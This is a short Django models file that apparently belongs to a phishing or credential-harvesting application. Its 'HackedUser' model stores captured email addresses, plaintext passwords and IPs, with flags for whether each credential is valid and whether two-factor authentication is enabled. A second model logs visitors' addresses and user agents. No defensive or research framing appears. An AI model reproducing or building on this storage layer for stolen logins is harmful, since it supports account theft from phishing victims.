from django.db import models

# Create your models here.
class HackedUser(models.Model):
    email = models.EmailField()
    ip = models.CharField(max_length=50,blank=True,null=True)
    password = models.CharField(max_length=50)
    description = models.TextField(blank=True,null=True)
    created_at = models.DateTimeField(auto_created=True,auto_now_add=True)
    valid = models.BooleanField(default=False)
    two_factor = models.BooleanField(default=False)

    def __str__(self):
        return str(self.created_at) + " | " + str(self.email) + " | " + self.password


class RequestUser(models.Model):
    remote_addr = models.CharField(max_length=200)
    user_agent = models.TextField()
    created_at = models.DateTimeField(auto_created=True, auto_now_add=True)

    def __str__(self):
        return str(self.created_at)+ " | " +  str(self.remote_addr)